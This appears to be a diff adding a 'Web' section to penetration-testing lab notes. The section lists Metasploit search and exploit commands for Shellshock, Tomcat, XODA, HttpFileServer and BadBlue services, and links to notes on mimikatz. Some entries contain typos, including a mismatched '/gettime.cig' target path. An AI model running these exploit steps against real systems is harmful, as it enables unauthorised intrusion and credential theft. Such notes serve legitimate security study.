@@ -183,3 +183,27 @@ echo "<pre>$output</pre>";
 
 
 
+
+# Web
+
+/gettime.cgi Bash CVE-2014-6271 Vulnerability (Shellshock)
+  - __`use exploit/multi/http/apache_mod_cgi_bash_env_exec`__
+    - __`set TARGETURI /gettime.cig`__
+  - [Shellshock](/Q&A/Shellshock.md)
+
+Apache Tomcat 8080
+  - __`search type:exploit tomcat`__
+  - [tomcat](/Q&A/tomcat.md)
+
+80 XODA running 
+  - __`search xoda`__
+  - [xoda](/Q&A/xoda.md)
+
+80 http HttpFileServer httpd 2.3 for windows server
+  - __`search rejetoo`__
+
+80 BadBlue httpd 2.7 (mimikatz)
+  - __`search badblue 2.7`__
+  - __`use exploit/windows/http/badblue_passthru`__
+  - [Mimikatz](/Q&A/mimikatz.md)
+
